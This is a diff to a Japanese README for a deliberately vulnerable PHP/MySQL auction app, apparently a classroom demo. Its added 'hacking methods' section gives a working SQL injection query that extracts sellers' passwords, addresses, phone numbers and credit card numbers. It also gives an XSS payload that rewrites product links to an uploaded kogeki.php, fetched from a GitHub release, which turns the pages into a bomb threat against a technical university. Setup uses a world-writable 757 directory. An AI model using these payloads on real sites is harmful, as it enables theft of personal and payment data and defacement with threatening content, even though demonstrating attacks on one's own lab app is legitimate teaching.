@@ -185,6 +185,10 @@ sudo chmod 757 /var/www/html/auction/images
 ```
 
 2.データベース作成
+mysqlからデータベース作成してもいいし、最新のプログラムをダウンロードした場合は
+**/auction/createdatabase.php**を開いていただくことでデータベースの作成からテーブルの作成まですべてやってくれます
+
+
 
 ```shell:mysql起動
 sudo mysql -u root -p
@@ -229,3 +233,34 @@ CREATE TABLE `Item_Image` (
     `image_path` VARCHAR(255) NOT NULL DEFAULT ''
 ) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
 ```
+
+
+3. ハッキング方法
+
+## sqlインジェクション攻撃
+**http://IPアドレス/auction/userview2.php**にアクセスし、下記sql文を入力する。
+最初にユーザーで検索できますよって言って見せてから下記sql文を入力するのもありかも！
+
+```sql:sqlinjec
+SELECT Item.item_id, Item.item_name, Item.item_price, Item.max_price, Item.buy_user, Item.item_user, Item.is_sold, Item.category, User.user_id, User.mail, User.password, UserAdd.address, UserAdd.phone , User_Credit.credit FROM Item INNER JOIN User ON Item.item_user = User.user_id INNER JOIN UserAdd ON User.user_id = UserAdd.user_id INNER JOIN User_Credit ON User.user_id = User_Credit.user_id;
+```
+
+出品者の情報（電話番号、住所、クレジットカード番号、パスワード）等の情報が抜き取ることが出来ますよーって説明する感じでいいと思う
+
+
+## XSS攻撃
+XSS攻撃は**http://IPアドレス/auction/image_add.php**にアクセスをし、商品名の欄に以下の値を入力する
+
+```js:xss
+ジャケット0719<script>document.addEventListener('DOMContentLoaded',function(){var e=document.querySelectorAll('.product-item');e.forEach(function(e){var t=e.querySelector('a');t&&(t.href='images/kogeki.php   ',console.log('リンクのhref属性を変更しました:',t.href))})});</script>
+```
+
+初期価格と、即決価格、カテゴリーは適当な値でOK
+
+ファイル選択欄でkogeki.phpをアップロードしてください。
+**DLLink:https://github.com/onoyuki53/projectAuction/releases/download/xss/kogeki.php**
+右クリック→リンク先を保存などで出来ると思う。
+出品をクリックしたらトップページに戻って、先ほど出品した商品名（デフォルトだと「ジャケット0719」）をクリックしたら工科大爆破予告にすべて変わります！
+
+
+これ通りにやる必要は全然ないので、もっといい方法があったらそれで大丈夫！
